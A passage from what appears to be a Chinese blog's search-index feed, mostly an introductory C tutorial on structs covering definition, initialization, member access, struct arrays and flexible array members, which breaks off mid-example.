class="line">&#125;</span><br></pre></td></tr></table></figure><p>注:零钱兑换题目是完全背包,但是求的是方案的数目.外物品内背包是组合数,外背包内物品是排列数.</p>]]></content>
      
      
      <categories>
          
          <category> 算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 算法 </tag>
            
            <tag> 动态规划 </tag>
            
            <tag> 背包问题 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>C语言教程-14_1-初识结构体</title>
      <link href="/20247276fcdb268f/"/>
      <url>/20247276fcdb268f/</url>
      
        <content type="html"><![CDATA[<p>概要:</p><ul><li>在更多情况下,数据的组织结构是非常复杂的,往往不是简单的几个变量甚至数组就能够表示的,许多有关联但不同类型的数据经常需要统一处理,为此,我们需要一种特殊的数据类型来将不同类型的数据组织起来,C语言提供了<code>结构体类型</code>来实现这种目的.</li></ul><p>前置知识:</p><ul><li>基本数据类型和数组</li></ul><h1 id="引入问题">引入问题</h1><h2 id="问题描述">问题描述</h2><p>现在需要存储一家书店的所有图书信息,并能够打印出来目录清单.为了简化问题,我们假设每种书只有以下信息:书名,作者,出版年份,页数,库存,价格.</p><p>同样为了简化问题,假设这家书店最多能购入一千种图书.我们的目的仅仅想要输入并存储一系列书籍信息,并按需求打印出来.</p><h2 id="问题分析">问题分析</h2><p>我们的目的是要存储每种书的各种信息,每种书有如下信息需要存储:</p><ol><li>书名—一个字符串</li><li>作者—一个字符串</li><li>出版年份—一个四位整数</li><li>页数—一个整数</li><li>库存—一个整数</li><li>价格—一个浮点数</li></ol><p>显然他们是不同类型的数据,我们如果只考虑使用一系列数组来存储:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> MAXN 1000 <span class="comment">// 最多存储1000种书</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">char</span> book_name[MAXN][<span class="number">31</span>]; <span class="comment">// 二维字符数组,每一行最多存储30个书名字符</span></span><br><span class="line">    <span class="type">char</span> author_name[MAXN][<span class="number">41</span>]; <span class="comment">// 二维字符数组,每一行最多存储30个作者字符</span></span><br><span class="line">    <span class="type">int</span> publication_year[MAXN]; <span class="comment">// 存储出版年份</span></span><br><span class="line">    <span class="type">int</span> page_cnt[MAXN]; <span class="comment">// 存储页数</span></span><br><span class="line">    <span class="type">int</span> stock_cnt[MAXN]; <span class="comment">// 存储库存数目</span></span><br><span class="line"><span class="type">float</span> price[MAXN]; <span class="comment">// 单精度浮点数存储价格</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中,对每个数组而言,第i个元素就是书店中第i+1本书(注意下标从0开始,这里+1结合实际)的信息.</p><p>例如第i本书的书名为<code>book_name[i]</code>,其页数为<code>page_cnt[i]</code>,就这么简单.</p><p>但是有一个很大问题,假设我们有一个函数用于处理某种书的各种信息,我们就需要将上面这些数组全部传递给这个函数,十分麻烦.</p><p>如果我们能够将各种书的同类信息分开,反而将每本书的各种不同信息组合在一起,我们就可以仅仅向这个函数传递特定的这一本书的信息,而无需将这些数组统统塞过去.</p><br><p>那么问题立刻转移为(注意学会将实际问题抽象为技术问题):如何将若干不同数据类型的数据包含在一个整合的数据结构中.</p><p>C语言提供<code>结构体数据类型</code>来实现该目的.</p><h1 id="struct-结构体类型">struct-结构体类型</h1><h2 id="一个不太恰当的比较">一个不太恰当的比较</h2><p>考虑数组和结构体:</p><ul><li><p>C语言的数组允许定义可存储大量同类型数据的变量.</p></li><li><p>而结构体则允许定义可存储若干不同类型数据的变量.</p></li></ul><p>这种简单但不恰当的比较帮助你有一个大概的第一印象.</p><h2 id="定义结构体">定义结构体</h2><p><code>结构体</code>(简称结构)属于自定义类型,因为一个<code>结构</code>中包含的各种数据项均由用户自行定义.</p><p>使用关键字<code>struct</code>来定义一个结构体(类型),语法为:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> &lt;</span>结构体名&gt;&#123;</span><br><span class="line">    &lt;基本数据类型<span class="number">1</span>&gt; &lt;成员<span class="number">1</span>&gt;;</span><br><span class="line">    &lt;基本数据类型<span class="number">2</span>&gt; &lt;成员<span class="number">2</span>&gt;;</span><br><span class="line">    &lt;基本数据类型<span class="number">3</span>&gt; &lt;成员<span class="number">3</span>&gt;;</span><br><span class="line">    ......</span><br><span class="line">&#125;[结构体变量名<span class="number">1</span>],[结构体变量名<span class="number">2</span>],......;</span><br></pre></td></tr></table></figure><p>需要注意的是,<code>结构体名</code>的地位相当于基本数据类型<code>int</code>,<code>double</code>…等等,他是一个类型,而不是实际的变量.</p><p>接下来就用该类型去声明一个实际的变量,即<code>结构体变量名</code>,同样,可以连续声明多个变量.</p><p>举一个简单的例子,我们用一个结构体来存储一对整数,用来表示一个二维坐标:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">COORD</span>&#123;</span> <span class="comment">// 结构体名往往用大写</span></span><br><span class="line">    <span class="type">int</span> x,y; <span class="comment">// 与平时一样,同类型变量可以声明在一行</span></span><br><span class="line">&#125;coord; <span class="comment">// 声明一个struct COORD类型的变量coord</span></span><br></pre></td></tr></table></figure><p>我们声明了一个结构体类型<code>struct COORD</code>,然后又声明了一个<code>struct COORD</code>类型的变量<code>coord</code>,它包含2个成员x和y,均为int类型.</p><p>需要注意的是,C语言中,使用一个结构体类型必须要在前面加上<code>struct</code>这个关键字,直接使用COORD是错误的.</p><br><p>当然,声明结构体类型和声明结构体变量是可以分开的,我们完全可以在前面实现声明该结构体类型COORD,然后在后面<code>适当的位置</code>声明变量:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="comment">// 当然,声明结构体类型和声明结构体变量是可以分开的,我们完全可以在前面实现声明该结构体类型COORD,然后在后面`适当的位置`声明变量:</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">COORD</span> &#123;</span></span><br><span class="line">    <span class="type">int</span> x;</span><br><span class="line">    <span class="type">int</span> y;</span><br><span class="line">&#125;; <span class="comment">// 在这里声明了一个全局的结构体类型COORD,这个类型可以在整个程序中使用</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">COORD</span> <span class="title">point</span>;</span> <span class="comment">// 在这里声明了一个局部的结构体变量point,这个变量只能在main函数中使用</span></span><br><span class="line">    point.x = <span class="number">10</span>;</span><br><span class="line">    point.y = <span class="number">20</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;x=%d, y=%d\n&quot;</span>, point.x, point.y); <span class="comment">// x=10, y=20</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>第8行中,我们完全可以把<code>struct COORD</code>看成类似于<code>int</code>,<code>char</code>这样的类型,声明该类型的变量即可.</p><h2 id="结构体变量的初始化">结构体变量的初始化</h2><p>结构体变量可以使用<code>花括号&#123;&#125;</code>包括的一系列值进行<code>初始化</code>,同时还有一些特殊的初始化写法.</p><h3 id="列表初始化">列表初始化</h3><p>和其他变量相同,可以对结构体变量在定义时指定初始值,不过,要使用<code>花括号&#123;&#125;</code>依次对其成员初始化:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">COORD</span>&#123;</span></span><br><span class="line">    <span class="type">int</span> x,y;</span><br><span class="line">&#125;coord=&#123;<span class="number">3</span>,<span class="number">4</span>&#125;; <span class="comment">// x和y依次初始化为3和4</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;x=%d,y=%d&quot;</span>,coord.x,coord.y);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>需要注意的是,如果初始化列表中的项不全(即有成员未被初始化),则他们默认被<code>零初始化</code>,即整数初始化为0,浮点数被初始化为正零,指针被初始化为对应类型的空指针等等.</p><h3 id="嵌套初始化">嵌套初始化</h3><p>若结构体的成员是另一个结构体/数组/联合体等,则依次用嵌套的花括号来初始化,如果内层没有嵌套的花括号,则将当前花括号中的项依次初始化对应的成员(即省略嵌套的内层括号).</p><p>看cppreference的解释和例子:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20240207003320547.png" alt="image-20240207003320547" style="zoom:50%;" /><h3 id="指派初始化式">指派初始化式</h3><p>与数组类似,可以使用<code>.成员</code>形式的结构体指派符来初始化指定的成员:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">COORD</span> &#123;</span></span><br><span class="line">        <span class="type">int</span> x, y, z;</span><br><span class="line">    &#125;coord = &#123; .y = <span class="number">4</span>,.x = <span class="number">3</span> &#125;;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;x=%d,y=%d&quot;</span>, coord.x, coord.y);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果为<code>x=3,y=4</code>.</p><p>注意这里.x和.y的顺序与他们在结构体中的顺序不同,在C语言是允许的,需要注意的是C++程序会报错,注意不要使用g++编译.</p><br><p>另外十分重要的一点是,<code>有指派符指定的成员</code>后继的<code>无指派符的初始化式</code>,会继续初始化先前<code>有指派符指定的成员</code>之后的结构体成员.</p><p>这句话会很拗口,上代码就知道了:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">VECTOR_5</span> &#123;</span></span><br><span class="line">        <span class="type">int</span> a, b, c, d, e;</span><br><span class="line">    &#125;vec = &#123; .c = <span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,.a = <span class="number">1</span>,<span class="number">2</span> &#125;;</span><br><span class="line">    <span class="comment">// 4和5被依次用于初始化c后面的d和e;</span></span><br><span class="line">    <span class="comment">// 2被用于初始化a后面的b</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 访问输出变量vec的每一个成员</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;vec.a = %d, vec.b = %d, vec.c = %d, vec.d = %d, vec.e = %d\n&quot;</span>,</span><br><span class="line">        vec.a, vec.b, vec.c, vec.d, vec.e);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20240207004759961.png" alt="image-20240207004759961" style="zoom:50%;" /><h2 id="访问结构体成员">访问结构体成员</h2><p>结构体变量是一个整体,我们实际访问的是该变量中具体的成员,使用<code>成员访问运算符(.)</code>来访问其成员.</p><p>注:为省事叫该运算符为<code>点运算符</code>也行.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">COORD</span>&#123;</span></span><br><span class="line">    <span class="type">int</span> x,y;</span><br><span class="line">&#125;coord=&#123;<span class="number">3</span>,<span class="number">4</span>&#125;; <span class="comment">// x和y分别初始化为3和4</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;x=%d,y=%d&quot;</span>,coord.x,coord.y); <span class="comment">// 获取成员x和y的值</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>很简单,输出<code>x=3,y=4</code>.</p><p>这里的coord.x和coord.y与普通的int变量没有任何区别,只不过他们是coord的成员罢了,依然可以进行赋值,运算,取地址等所有操作.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">COORD</span> &#123;</span></span><br><span class="line">        <span class="type">int</span> x, y;</span><br><span class="line">    &#125;coord = &#123; <span class="number">3</span>,<span class="number">4</span> &#125;;</span><br><span class="line">    <span class="type">int</span> *p = &amp;coord.x; <span class="comment">// 获取成员x的地址</span></span><br><span class="line">    *p = <span class="number">5</span>; <span class="comment">// 间接修改成员x的值</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;x=%d,y=%d\n&quot;</span>, coord.x, coord.y); <span class="comment">// 获取成员x和y的值</span></span><br><span class="line">    coord.y++; <span class="comment">// 修改成员y的值,其中成员运算符的优先级高于自增运算符</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;x=%d,y=%d\n&quot;</span>, coord.x, coord.y); <span class="comment">// 获取成员x和y的值</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20240207183139962.png" alt="image-20240207183139962" style="zoom:50%;" /><h2 id="注意">注意</h2><h3 id="不能包含自身类型的成员">不能包含自身类型的成员</h3><p>下面的代码是一个错误的示范:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">// 结构体不能包含自身类型的成员</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Node</span> &#123;</span></span><br><span class="line">        <span class="type">int</span> data;</span><br><span class="line">        Node next;</span><br><span class="line">    &#125;; <span class="comment">// 编译错误</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>很简单的道理,一个结构体类型如果包含自身类型的成员,那么就会无限递归下去,结构体的大小就无法确定,导致编译报错.</p><p>不过,可以包含指向自身类型的指针,后面会讲解.</p><h1 id="结构体与数组">结构体与数组</h1><h2 id="数组作为结构体成员">数组作为结构体成员</h2><p>结构体内可以包含任意类型的成员,甚至可以包含另一个结构体类型的成员(注意不能是自身类型)</p><p>数组也可以作为结构体的成员,与常规的数组并无二致:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">        <span class="type">int</span> x;</span><br><span class="line">        <span class="type">int</span> a[<span class="number">3</span>];</span><br><span class="line">    &#125; s;</span><br><span class="line">    s.x = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">3</span>; i++) &#123;</span><br><span class="line">        s.a[i] = i;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d %d %d %d\n&quot;</span>, s.x, s.a[<span class="number">0</span>], s.a[<span class="number">1</span>], s.a[<span class="number">2</span>]);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>运行结果:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20240207232917986.png" alt="image-20240207232917986" style="zoom:50%;" /><p>当然也有特殊性—结构体类型变量可以互相赋值,如果有数组成员照样可以整体复制过去,而不同于普通的数组:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">// 与普通的数组不同</span></span><br><span class="line">    <span class="comment">// 结构体的数组成员可以互相赋值</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">TEST</span>&#123;</span></span><br><span class="line">        <span class="type">int</span> a;</span><br><span class="line">        <span class="type">int</span> arr[<span class="number">10</span>];</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">TEST</span> <span class="title">t1</span>, <span class="title">t2</span>;</span></span><br><span class="line">    t1.a = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++) &#123;</span><br><span class="line">        t1.arr[i] = i;</span><br><span class="line">    &#125;</span><br><span class="line">    t2 = t1;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;t2.a = %d\n&quot;</span>, t2.a);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;t2.arr = &#123;\n    &quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d, &quot;</span>, t2.arr[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&#125;\n&quot;</span>);</span><br><span class="line">    <span class="comment">// 可以看出,结构体的数组成员可以互相赋值,完整的复制   </span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20240209154142760.png" alt="image-20240209154142760" style="zoom:50%;" /><h2 id="柔性数组">柔性数组</h2><p>本节前置知识:指针,数组,结构体与指针,动态内存分配</p><p>PS:我本来认为这里暂时没有必要加入<code>柔性数组</code>的内容,对于新手来说为时尚早,不仅没有用武之地,反而会增加理解负担.不过考虑知识框架的完整性,还是放进来,读者选择性阅读.</p><p><code>柔性数组</code>产生于对动态结构体的需求.</p><br><p>考虑使用结构体实现网络数据包的存储.如果我们使用一个结构体来封装网络数据包,使用定长的缓冲区,为了防止缓冲溢出,缓冲区一般设置的足够大.那么当数据包实际大小没有那么多时,就会导致数组空间大量冗余:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//  定长数组的缓冲区,默认大小为1K</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> MAX_LENGTH 1024</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Buffer</span> &#123;</span></span><br><span class="line">    <span class="type">int</span> len;</span><br><span class="line">    <span class="type">char</span> data[MAX_LENGTH];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>当data中实际荷载的数据少于1K时(平时通信大多都是小包),就会浪费大量的空间,甚至会消耗很多流量.</p><br><p>另一种思路是将data成员换成指针,每个实例分配不同长度的内存:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//  动态分配内存的缓冲区</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Buffer</span> &#123;</span></span><br><span class="line">    <span class="type">int</span> len;</span><br><span class="line">    <span class="type">char</span> *data;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>这种方法可以让缓冲区大小可变,但是缺点也很明显,结构体本身和数据缓冲区是分开的(不连续),需要分别进行管理,导致内存碎片,加大内存管理的难度.</p><br><p>C99后,使用柔性数组成员可以直接构造变长的结构体,既提高内存利用率,又减少内存碎片.</p><p>柔性数组使用如下:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//  柔性数组实现的缓冲区</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Buffer</span> &#123;</span></span><br><span class="line">    <span class="type">int</span> len;</span><br><span class="line">    <span class="type">char</span> data[<span class="number">0</span>]; <span class="comment">// 长度为0</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>需要注意的是,data的长度为0,它并不在结构体中占用任何空间!其仅仅起到一个占位的作用,数组名代表它只是一个偏移量!(了解结构体底层实现的朋友一定知道我在说什么)</p><p>只有在内存分配后data才会有其用武之地,指向多分配的变长部分内存.</p><p>如此为使用柔性数组的结构体分配内存:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ((buffer = (<span class="keyword">struct</span> Buffer*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> Buffer) + <span class="keyword">sizeof</span>(<span class="type">char</span>) * cur_length)) != <span class="literal">NULL</span>) &#123;</span><br><span class="line">    buffer-&gt;len = cur_length; <span class="comment">// 存储长度</span></span><br><span class="line">    <span class="built_in">memcpy</span>(buffer-&gt;data,payload_data,cur_length); <span class="comment">// 复制有效荷载数据</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用完后直接将整个结构体的内存一次free即可,无需两次free:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">free</span>(buffer);</span><br><span class="line">buffer = <span class="literal">NULL</span>;</span><br></pre></td></tr></table></figure><h2 id="结构体数组">结构体数组</h2><p>结构体是一种自定义类型,也可以声明各元素均为结构体类型的数组,即结构体数组.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">// 该结构体包含三个成员变量,分别存储学生的姓名,年龄和分数</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">student</span> &#123;</span></span><br><span class="line">        <span class="type">char</span> name[<span class="number">20</span>];</span><br><span class="line">        <span class="type">int</span> age;</span><br><span class="line">        <span class="type">float</span> score;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="comment">// 使用该结构体定义一个数组stu,存储三个学生的信息</span></span><br><span class="line">    <span class="comment">// 每个元素使用花括号&#123;&#125;初始化,分别存储学生的姓名,年龄和分数</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">student</span> <span class="title">stu</span>[3] =</span> &#123;&#123;<span class="string">&quot;Tom&quot;</span>, <span class="number">18</span>, <span class="number">90.5</span>&#125;, &#123;<span class="string">&quot;Jerry&quot;</span>, <span class="number">19</span>, <span class="number">88.5</span>&#125;, &#123;<span class="string">&quot;Marry&quot;</span>, <span class="number">17</span>, <span class="number">85.5</span>&#125;&#125;;</span><br><span class="line">    <span class="comment">// 使用for循环遍历数组stu,输出每个学生的信息</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">3</span>; i++) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;name:%s, age:%d, score:%.1f\n&quot;</span>, stu[i].name, stu[i].age, stu[i].score);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>运行结果:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20240207234113278.png" alt="image-20240207234113278" style="zoom:50%;" /><h1 id="中场休息-解决引例-的一部分">中场休息-解决引例(的一部分)</h1><p>到现在我们已经有一定能力解决前面提出的问题了(其实,还差了指针),这里把要实现的数据项重新放出来:</p><ol><li>书名—一个字符串</li><li>作者—一个字符串</li><li>出版年份—一个四位整数</li><li>页数—一个整数</li><li>库存—一个整数</li><li>价格—一个浮点数</li></ol><p>使用结构体很容易实现这样一种书的类型:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 书籍结构体</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Book</span> &#123;</span></span><br><span class="line">    <span class="type">char</span> name[<span class="number">100</span>]; <span class="comment">// 书名</span></span><br><span class="line">    <span class="type">char</span> author[<span class="number">100</span>]; <span class="comment">// 作者</span></span><br><span class="line">    <span class="type">int</span> year; <span class="comment">// 出版年份</span></span><br><span class="line">    <span class="type">int</span> page; <span class="comment">// 页数</span></span><br><span class="line">    <span class="type">int</span> stock; <span 